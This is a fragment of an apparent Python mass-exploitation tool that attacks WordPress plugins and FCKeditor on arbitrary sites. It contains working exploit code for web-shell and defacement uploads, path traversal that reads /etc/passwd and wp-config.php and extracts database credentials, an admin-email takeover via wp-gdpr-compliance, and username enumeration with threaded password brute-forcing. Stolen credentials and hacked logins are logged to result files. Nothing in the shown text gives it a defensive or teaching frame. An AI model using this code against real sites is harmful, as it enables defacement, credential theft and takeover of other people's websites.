            self.Print_NotVuln("No conf",site)                  
    def viral_optins(self, site):
        try:
            defaceFile = {
                'Filedata': ('vuln.txt', open(self.TextindeX, 'rb'), 'text/html')
            }
            x = requests.post('http://' + site + '/wp-content/plugins/viral-optins/api/uploader/file-uploader.php',
                              files=defaceFile, timeout=5, headers=self.Headers)
            if 'id="wpvimgres"' in x.text:
                uploader = site + '/wp-content/uploads/20' + self.year + '/' + self.month + '/vuln.txt'
                GoT = requests.get('http://' + uploader, timeout=5, headers=self.Headers)
                find = re.findall('<img src="http://(.*)" height="', x.text)
                GoT2 = requests.get('http://' + find[0], timeout=5, headers=self.Headers)
                if 'Vuln!!' in GoT.text:
                    self.Print_Vuln_index(site + '/wp-content/uploads/20' + self.year + '/' + self.month + '/vuln.txt')
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/wp-content/uploads/20' + self.year + '/' + self.month + '/vuln.txt' + '\n')
                elif 'Vuln!!' in GoT2.text:
                    self.Print_Vuln_index(find[0])
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + find[0] + '\n')
                else:
                    self.Print_NotVuln('viral optins', site)
            else:
                self.Print_NotVuln('viral optins', site)
        except:
            self.Print_NotVuln('viral optins', site)


    

    def FckPath(self, zzz):
        try:
            find = re.findall(',"(.*)","', zzz)
            path = find[0].strip()
            return path
        except:
            pass

    def FckEditor(self, site):
        try:
            exp2 = '/fckeditor/editor/filemanager/connectors/php/upload.php?Type=Media'
            try:
                CheckVuln = requests.get('http://' + site + exp2, timeout=5, headers=self.Headers)
                if 'OnUploadCompleted(202' in CheckVuln.text:
                    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0',
                               'Accept': '*/*'}
                    exp = 'http://' + site + exp2
                    po = {'Content_Type': 'form-data'}
                    fil = {'NewFile': open(self.Jce_Deface_image, 'rb')}
                    rr = requests.post(exp, data=po, headers=headers, timeout=10, files=fil)
                    if '.gif' in rr.text:
                        zart = self.FckPath(rr.text)
                        x = 'http://' + site + str(zart)
                        wcheck2 = requests.get(x, timeout=10, headers=self.Headers)
                        if wcheck2.status_code == 200:
                            check_deface = requests.get(x, timeout=10, headers=self.Headers)
                            if 'GIF89a' in check_deface.text:
                                self.Print_Vuln_index(site + str(zart))
                                with open('result/Index_results.txt', 'a') as writer:
                                    writer.write(site + str(zart) + '\n')
                            else:
                                self.Print_NotVuln('fckeditor', site)
                        else:
                            self.Print_NotVuln('fckeditor', site)
                    else:
                        self.Print_NotVuln('fckeditor', site)
                else:
                    self.Print_NotVuln('fckeditor', site)
            except:
                self.Print_NotVuln('fckeditor', site)
        except:
            self.Print_NotVuln('fckeditor', site)

   
    
    
    
    
    def wp_miniaudioplayer(self, site):
        CheckVuln = requests.get('http://' + site, timeout=10, headers=self.Headers)
        if 'wp-miniaudioplayer' in CheckVuln.text:
            etc = requests.get('http://' + site +
                         '/wp-content/plugins/wp-miniaudioplayer/map_download.php?fileurl=/etc/passwd',
                               timeout=5, headers=self.Headers)
            if 'nologin' in etc.text:
                with open('result/Passwd_file.text', 'a') as writer:
                    writer.write('---------------------------\nSite: ' + site + '\n' + etc.text + '\n')
                self.Print_Vuln('wp-miniaudioplayer', site)
            else:
                self.Print_NotVuln('wp-miniaudioplayer', site)
        else:
            self.Print_NotVuln('wp-miniaudioplayer', site)



    def wp_support_plus_responsive_ticket_system(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-content/plugins/wp-support-plus-responsive-ticket-system/includes/admin/' \
                  'downloadAttachment.php?path=../../../../../wp-config.php'
            GetConfig = requests.get(Exp, timeout=5, headers=self.Headers)
            if 'DB_PASSWORD' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('result/Config_results.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text)
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text)
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text)
                    with open('result/Config_results.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    self.Print_NotVuln('wp-support-plus-responsive-ticket-system', site)
            else:
                self.Print_NotVuln('wp-support-plus-responsive-ticket-system', site)
        except:
            self.Print_NotVuln('wp-support-plus-responsive-ticket-system', site)

    def eshop_magic(self, site):
        try:
            Exp = 'http://' + site + \
                  'wp-content/plugins/eshop-magic/download.php?file=../../../../wp-config.php'
            GetConfig = requests.get(Exp, timeout=5, headers=self.Headers)
            if 'DB_PASSWORD' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('result/Config_results.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text)
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text)
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text)
                    with open('result/Config_results.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    self.Print_NotVuln('eshop-magic', site)
            else:
                self.Print_NotVuln('eshop-magic', site)
        except:
            self.Print_NotVuln('eshop-magic', site)

    def ungallery(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-content/plugins/ungallery/source_vuln.php?pic=../../../../../wp-config.php'
            GetConfig = requests.get(Exp, timeout=5, headers=self.Headers)
            if 'DB_PASSWORD' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('result/Config_results.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text)
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text)
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text)
                    with open('result/Config_results.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    self.Print_NotVuln('ungallery', site)
            else:
                self.Print_NotVuln('ungallery', site)
        except:
            self.Print_NotVuln('ungallery', site)


    

    def barclaycart(self, site):
        try:
            ShellFile = {'Filedata': (self.pagelinesExploitShell, open(self.pagelinesExploitShell, 'rb')
                                  , 'multipart/form-data')}
            Exp = 'http://' + site + '/wp-content/plugins/barclaycart/uploadify/uploadify.php'
            requests.post(Exp, files=ShellFile, timeout=5, headers=self.Headers)
            Shell = 'http://' + site + '/wp-content/plugins/barclaycart/uploadify/' \
                    + self.pagelinesExploitShell.split('/')[1]
            GoT = requests.get(Shell, timeout=5, headers=self.Headers)
            if GoT.status_code == 200:
                CheckShell = requests.get('http://' + site + '/wp-content/vuln.php', timeout=5, headers=self.Headers)
                CheckIndex = requests.get('http://' + site + '/vuln.htm', timeout=5, headers=self.Headers)
                if 'Vuln!!' in CheckShell.text:
                    self.Print_vuln_Shell(site + '/wp-content/vuln.php')
                    with open('result/Shell_results.txt', 'a') as writer:
                        writer.write(site + '/wp-content/vuln.php' + '\n')
                if 'Vuln!!' in CheckIndex.text:
                    self.Print_Vuln_index(site + '/vuln.htm')
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/vuln.htm' + '\n')
                else:
                    self.Print_NotVuln('barclaycart plugin', site)
            else:
                self.Print_NotVuln('barclaycart plugin', site)
        except:
            self.Print_NotVuln('barclaycart plugin', site)

    

    def wp_gdpr_compliance(self, site):
        try:
            Ex1 = 'http://' + site + '/wp-admin/admin-ajax.php'
            headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
            GET = requests.get('http://' + site, headers=headers, timeout=10)
            AjaxTokEN = re.findall('"ajaxSecurity":"(.*)"', GET.text)[0]
            payload = {'action': 'wpgdprc_process_action', 'security': str(AjaxTokEN)}
            payload['data'] = json.dumps({
                'type': 'save_setting',
                'append': False,
                'option': 'new_admin_email',
                'value': self.EMail,
            })
            GG = requests.post(Ex1, timeout=5, headers=headers, data=payload)
            if '{"message":"","error":""}' in GG.text:
                self.AdminTakeOver('WPGDPR', site)
                with open('result/AdminTakeoverWpgdp_results.txt', 'a') as writer:
                    writer.write('{}/wp-login.php?action=lostpassword --> {}'
                                 ' Email Ready To rest Password!'.format(site, self.EMail))
            else:
                self.Print_NotVuln('wp-gdpr-compliance Exploit', site)
        except:
            self.Print_NotVuln('wp-gdpr-compliance Exploit', site)

    

    

    

    



    class Wordpress(object):
        def __init__(self, site):
            self.flag = 0
            self.r = '\033[31m'
            self.g = '\033[32m'
            self.y = '\033[33m'
            self.b = '\033[34m'
            self.m = '\033[35m'
            self.c = '\033[36m'
            self.w = '\033[37m'
            self.rr = '\033[39m'
            self.password = ["admin", "demo", "admin123", "123456", "123456789", "123", "1234", "12345", "1234567", "12345678",
                        "123456789", "admin1234", "admin123456", "pass123", "root", "321321", "123123", "112233", "102030",
                        "password", "pass", "qwerty", "abc123", "654321", "pass1234", "abc1234", "demo1", "demo2",
                        "demodemo", "site", "shop", "password123", "admin1", "admin12", "adminqwe", "test", "test123", "1",
                        "12", "123123"]
            try:
                Headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'
                }
                source = requests.get('http://' + site + '/wp-login.php', timeout=5, headers=Headers).text
                WpSubmitValue = re.findall('class="button button-primary button-large" value="(.*)"', source)[0]
                WpRedirctTo = re.findall('name="redirect_to" value="(.*)"', source)[0]
                if 'Log In' in WpSubmitValue:
                    WpSubmitValue = 'Log+In'
                else:
                    WpSubmitValue = WpSubmitValue
                thread = []
                usernameWp = self.UserName_Enumeration(site)
                if usernameWp == None:
                    username = 'admin'
                else:
                    username = usernameWp
                for passwd in self.password:
                    t = threading.Thread(target=self.BruteForce,
                                         args=(site, passwd, WpSubmitValue, WpRedirctTo, username))
                    if self.flag == 1:
                        break
                    else:
                        t.start()
                        thread.append(t)
                        time.sleep(0.08)
                for j in thread:
                    j.join()
                if self.flag == 0:
                    print(self.c + '       [' + self.y + '-' + self.c + '] ' + self.r + site + ' '
                          + self.y + 'Wordpress BruteForce' + self.c + ' [Not Vuln]')
            except:
                print(self.c + '       [' + self.y + '-' + self.c + '] ' + self.r + site + ' '
                      + self.y + 'Wordpress BruteForce' + self.c + ' [Not Vuln]')

        def UserName_Enumeration(self, site):
            Headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'
            }
            _cun = 1
            Flag = True
            __Check2 = requests.get('http://' + site + '/?author=1', timeout=10, headers=Headers)
            try:
                while Flag:
                    GG = requests.get('http://' + site + '/wp-json/wp/v2/users/' + str(_cun),
                                      timeout=10, headers=Headers)
                    __InFo = json.loads(GG.text)
                    if 'id' not in __InFo:
                        Flag = False
                    else:
                        Usernamez = __InFo['slug']
                        return Usernamez
                    break
            except:
                try:
                    if '/author/' not in __Check2.text:
                        return None
                    else:
                        find = re.findall('/author/(.*)/"', __Check2.text)
                        username = find[0]
                        if '/feed' in username:
                            find = re.findall('/author/(.*)/feed/"', __Check2.text)
                            username2 = find[0]
                            return username2
                        else:
                            return username
                except requests.exceptions.ReadTimeout:
                    return None

        def BruteForce(self, site, passwd, WpSubmitValue, WpRedirctTo, username):
            try:
                sess = requests.session()
                Headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Content-Type': 'application/x-www-form-urlencoded'
                }
                post = {}
                post['log'] = username
                post['pwd'] = passwd
                post['wp-submit'] = WpSubmitValue
                post['redirect_to'] = WpRedirctTo
                post['testcookie'] = 1
                url = site + '/wp-login.php'
                GoT = sess.post('http://' + url, data=post, headers=Headers, timeout=10)
                if 'wordpress_logged_in_' in str(GoT.cookies) or 'action=logout' in GoT.text:
                    print(self.c + '       [' + self.y + '+' + self.c + '] ' +
                          self.r + site + ' ' + self.y + 'Wordpress' + self.g + ' [Hacked!!]')
                    with open('result/Wordpress_Hacked.txt', 'a') as writer:
                        writer.write('http://' + site + '/wp-login.php' + '\n Username: {}'.format(username) +
                                     '\n Password: ' +
                                     passwd + '\n-----------------------------------------\n')
                    self.flag = 1
            except:
                pass


    

AutoExploiter()
